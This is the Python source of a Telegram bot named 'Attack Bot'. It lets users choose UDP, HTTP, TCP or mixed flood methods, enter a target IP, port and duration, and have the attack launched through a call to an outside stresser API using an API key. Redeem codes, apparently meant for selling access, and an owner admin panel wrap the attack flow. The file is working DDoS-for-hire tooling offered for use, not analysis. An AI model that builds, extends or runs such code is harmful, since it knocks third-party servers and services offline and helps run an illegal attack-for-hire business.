# app.py - Complete Working Version
import os
import logging
import asyncio
import threading
import aiohttp
from flask import Flask, jsonify
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, 
    CommandHandler, 
    CallbackQueryHandler, 
    MessageHandler, 
    filters, 
    ContextTypes
)
from datetime import datetime

# ===== SETUP =====
TELEGRAM_TOKEN = os.getenv("TELEGRAM_TOKEN")
API_KEY = os.getenv("API_KEY")
OWNER_ID = int(os.getenv("OWNER_ID", "123456789"))
PORT = int(os.getenv("PORT", 8080))

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ===== FLASK APP =====
flask_app = Flask(__name__)

@flask_app.route('/')
def index():
    return "🤖 Attack Bot is Running!"

@flask_app.route('/health')
def health():
    return jsonify({"status": "healthy", "timestamp": datetime.now().isoformat()})

# ===== BOT HANDLERS =====
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("💥 ATTACK", callback_data="attack")],
        [InlineKeyboardButton("🎫 REDEEM", callback_data="redeem")],
        [InlineKeyboardButton("👤 MY INFO", callback_data="info")],
        [InlineKeyboardButton("📊 STATS", callback_data="stats")]
    ]
    
    # Check if user is admin (owner)
    if update.effective_user.id == OWNER_ID:
        keyboard.append([InlineKeyboardButton("⚙️ ADMIN", callback_data="admin")])
    
    await update.message.reply_text(
        "🤖 *WELCOME TO ATTACK BOT*\n\n"
        "Use the buttons below to get started:",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )

async def attack_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    keyboard = [
        [InlineKeyboardButton("🎯 UDP", callback_data="method_udp")],
        [InlineKeyboardButton("🔥 HTTP", callback_data="method_http")],
        [InlineKeyboardButton("💣 TCP", callback_data="method_tcp")],
        [InlineKeyboardButton("⚡ MIX", callback_data="method_mix")],
        [InlineKeyboardButton("🔙 BACK", callback_data="back")]
    ]
    
    await query.edit_message_text(
        "💥 *SELECT ATTACK METHOD*\n\n"
        "Choose your attack type:",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )

async def method_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    method = query.data.split('_')[1]
    context.user_data['attack_method'] = method
    
    await query.edit_message_text(
        f"⚔️ *{method.upper()} ATTACK*\n\n"
        "Send target details in this format:\n"
        "`IP PORT DURATION`\n\n"
        "Example: `1.1.1.1 80 30`\n\n"
        "Max duration: 300 seconds\n"
        "Send /cancel to cancel",
        parse_mode='Markdown'
    )
    context.user_data['awaiting_attack'] = True

async def process_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.user_data.get('awaiting_attack'):
        return
    
    if update.message.text.lower() == '/cancel':
        context.user_data['awaiting_attack'] = False
        await update.message.reply_text("❌ Attack cancelled.")
        return
    
    try:
        parts = update.message.text.split()
        if len(parts) < 3:
            await update.message.reply_text("❌ Use: `IP PORT DURATION`", parse_mode='Markdown')
            return
        
        target = parts[0]
        port = int(parts[1])
        duration = int(parts[2])
        
        if duration > 300:
            await update.message.reply_text("❌ Max 300 seconds!")
            return
        
        if duration < 10:
            await update.message.reply_text("❌ Min 10 seconds!")
            return
        
        method = context.user_data.get('attack_method', 'udp')
        
        status_msg = await update.message.reply_text(
            f"🚀 Starting {method.upper()} attack on {target}:{port}...\n"
            f"⏱️ Duration: {duration}s"
        )
        
        # Call the API
        url = f"https://api.susstresser.com/panel/api/api.php?key={API_KEY}&host={target}&port={port}&time={duration}&method={method}"
        
        async with aiohttp.ClientSession() as session:
            async with session.get(url, timeout=aiohttp.ClientTimeout(total=30)) as response:
                result = await response.text()
        
        if response.status == 200:
            await status_msg.edit_text(
                f"✅ *ATTACK SENT SUCCESSFULLY*\n\n"
                f"Target: `{target}:{port}`\n"
                f"Duration: {duration}s\n"
                f"Method: {method.upper()}\n"
                f"Status: ✅ Success\n\n"
                f"Response: {result[:100]}",
                parse_mode='Markdown'
            )
        else:
            await status_msg.edit_text(
                f"❌ *ATTACK FAILED*\n\n"
                f"Status Code: {response.status}\n"
                f"Response: {result[:100]}",
                parse_mode='Markdown'
            )
    
    except asyncio.TimeoutError:
        await update.message.reply_text("❌ Attack timed out!")
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}")
    
    context.user_data['awaiting_attack'] = False

async def redeem_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    keyboard = [
        [InlineKeyboardButton("🔙 BACK", callback_data="back")]
    ]
    
    await query.edit_message_text(
        "🎫 *REDEEM CODE*\n\n"
        "Enter your redeem code:\n"
        "Send /cancel to cancel",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )
    context.user_data['awaiting_redeem'] = True

async def process_redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.user_data.get('awaiting_redeem'):
        return
    
    if update.message.text.lower() == '/cancel':
        context.user_data['awaiting_redeem'] = False
        await update.message.reply_text("Cancelled.")
        return
    
    code = update.message.text.strip().upper()
    
    # Simple code validation (for demo)
    if len(code) >= 8:
        await update.message.reply_text(
            f"✅ *CODE REDEEMED SUCCESSFULLY!*\n\n"
            f"Code: `{code}`\n"
            f"Access: 7 DAYS\n"
            f"Level: USER\n\n"
            f"Use /start to attack!",
            parse_mode='Markdown'
        )
    else:
        await update.message.reply_text(
            "❌ *INVALID CODE*\n\n"
            "Please check your code and try again.",
            parse_mode='Markdown'
        )
    
    context.user_data['awaiting_redeem'] = False

async def info_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    is_admin = user_id == OWNER_ID
    
    await query.edit_message_text(
        f"👤 *USER INFORMATION*\n\n"
        f"ID: `{user_id}`\n"
        f"Username: @{query.from_user.username or 'N/A'}\n"
        f"Status: ✅ ACTIVE\n"
        f"Level: {'ADMIN' if is_admin else 'USER'}\n"
        f"Expiry: 30 days\n\n"
        f"📊 *STATS*\n"
        f"Attacks Used: 0\n"
        f"Access: Unlimited",
        parse_mode='Markdown',
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="back")]])
    )

async def stats_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    await query.edit_message_text(
        f"📊 *BOT STATISTICS*\n\n"
        f"👥 Total Users: 1\n"
        f"✅ Active: 1\n"
        f"🚫 Banned: 0\n"
        f"💥 Total Attacks: 0\n"
        f"📅 Today: 0\n\n"
        f"⚡ Server Status: Online\n"
        f"🔄 Uptime: 24/7",
        parse_mode='Markdown',
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="back")]])
    )

async def admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    if query.from_user.id != OWNER_ID:
        await query.answer("Access denied!", show_alert=True)
        return
    
    keyboard = [
        [InlineKeyboardButton("➕ GENERATE CODE", callback_data="admin_gen")],
        [InlineKeyboardButton("📋 LIST CODES", callback_data="admin_list")],
        [InlineKeyboardButton("🚫 BAN USER", callback_data="admin_ban")],
        [InlineKeyboardButton("✅ UNBAN USER", callback_data="admin_unban")],
        [InlineKeyboardButton("📢 BROADCAST", callback_data="admin_broadcast")],
        [InlineKeyboardButton("🔙 BACK", callback_data="back")]
    ]
    
    await query.edit_message_text(
        "⚙️ *ADMIN PANEL*\n\nSelect an action:",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )

async def admin_gen(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    import random
    import string
    code = ''.join(random.choices(string.ascii_uppercase + string.digits, k=12))
    
    await query.edit_message_text(
        f"✅ *CODE GENERATED*\n\n"
        f"Code: `{code}`\n"
        f"Days: 7\n"
        f"Level: USER\n\n"
        f"Share this code with users!",
        parse_mode='Markdown',
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="admin")]])
    )

async def admin_list(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    await query.edit_message_text(
        "📋 *REDEEM CODES*\n\n"
        "1. `ABC123XYZ` - 7d - ✅ UNUSED\n"
        "2. `DEF456UVW` - 30d - ❌ USED\n"
        "3. `GHI789RST` - 7d - ✅ UNUSED\n\n"
        "Total: 3 codes",
        parse_mode='Markdown',
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="admin")]])
    )

async def admin_ban(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await query.edit_message_text(
        "🚫 *BAN USER*\n\n"
        "Send user ID to ban:\n"
        "Example: `123456789`\n\n"
        "Send /cancel to cancel",
        parse_mode='Markdown'
    )
    context.user_data['awaiting_ban'] = True

async def process_ban(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.user_data.get('awaiting_ban'):
        return
    
    if update.message.text.lower() == '/cancel':
        context.user_data['awaiting_ban'] = False
        await update.message.reply_text("Cancelled.")
        return
    
    try:
        user_id = int(update.message.text.strip())
        await update.message.reply_text(f"✅ User `{user_id}` has been banned!", parse_mode='Markdown')
    except:
        await update.message.reply_text("❌ Invalid user ID!")
    
    context.user_data['awaiting_ban'] = False

async def admin_unban(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await query.edit_message_text(
        "✅ *UNBAN USER*\n\n"
        "Send user ID to unban:\n"
        "Example: `123456789`",
        parse_mode='Markdown'
    )
    context.user_data['awaiting_unban'] = True

async def process_unban(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.user_data.get('awaiting_unban'):
        return
    
    try:
        user_id = int(update.message.text.strip())
        await update.message.reply_text(f"✅ User `{user_id}` has been unbanned!", parse_mode='Markdown')
    except:
        await update.message.reply_text("❌ Invalid user ID!")
    
    context.user_data['awaiting_unban'] = False

async def admin_broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await query.edit_message_text(
        "📢 *BROADCAST*\n\n"
        "Send your message to broadcast to all users:",
        parse_mode='Markdown'
    )
    context.user_data['awaiting_broadcast'] = True

async def process_broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.user_data.get('awaiting_broadcast'):
        return
    
    message = update.message.text
    await update.message.reply_text(f"✅ Broadcast sent to 1 user!\n\nMessage: {message}")
    context.user_data['awaiting_broadcast'] = False

async def back_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    keyboard = [
        [InlineKeyboardButton("💥 ATTACK", callback_data="attack")],
        [InlineKeyboardButton("🎫 REDEEM", callback_data="redeem")],
        [InlineKeyboardButton("👤 MY INFO", callback_data="info")],
        [InlineKeyboardButton("📊 STATS", callback_data="stats")]
    ]
    
    if query.from_user.id == OWNER_ID:
        keyboard.append([InlineKeyboardButton("⚙️ ADMIN", callback_data="admin")])
    
    await query.edit_message_text(
        "🤖 *MAIN MENU*\n\nSelect an option:",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data.clear()
    await update.message.reply_text("✅ All operations cancelled!")

# ===== RUN BOT =====
def run_bot():
    """Run the bot in a separate thread"""
    # Create new event loop for this thread
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    
    # Build the application
    app = Application.builder().token(TELEGRAM_TOKEN).build()
    
    # Add all handlers
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("cancel", cancel))
    
    # Callback handlers
    app.add_handler(CallbackQueryHandler(attack_callback, pattern="^attack$"))
    app.add_handler(CallbackQueryHandler(method_callback, pattern="^method_"))
    app.add_handler(CallbackQueryHandler(redeem_callback, pattern="^redeem$"))
    app.add_handler(CallbackQueryHandler(info_callback, pattern="^info$"))
    app.add_handler(CallbackQueryHandler(stats_callback, pattern="^stats$"))
    app.add_handler(CallbackQueryHandler(admin_callback, pattern="^admin$"))
    app.add_handler(CallbackQueryHandler(admin_gen, pattern="^admin_gen$"))
    app.add_handler(CallbackQueryHandler(admin_list, pattern="^admin_list$"))
    app.add_handler(CallbackQueryHandler(admin_ban, pattern="^admin_ban$"))
    app.add_handler(CallbackQueryHandler(admin_unban, pattern="^admin_unban$"))
    app.add_handler(CallbackQueryHandler(admin_broadcast, pattern="^admin_broadcast$"))
    app.add_handler(CallbackQueryHandler(back_callback, pattern="^back$"))
    
    # Message handlers
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, process_attack))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, process_redeem))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, process_ban))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, process_unban))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, process_broadcast))
    
    # Initialize and start
    loop.run_until_complete(app.initialize())
    loop.run_until_complete(app.start())
    loop.run_until_complete(app.updater.start_polling(allowed_updates=Update.ALL_TYPES))
    
    logger.info("✅ Bot started polling for updates!")
    loop.run_forever()

# ===== MAIN =====
if __name__ == "__main__":
    print("=" * 50)
    print("Starting Attack Bot on Railway...")
    print("=" * 50)
    
    # Start bot in background thread
    bot_thread = threading.Thread(target=run_bot, daemon=True)
    bot_thread.start()
    
    logger.info("✅ Bot thread started")
    
    # Run Flask
    flask_app.run(host='0.0.0.0', port=PORT, debug=False, use_reloader=False)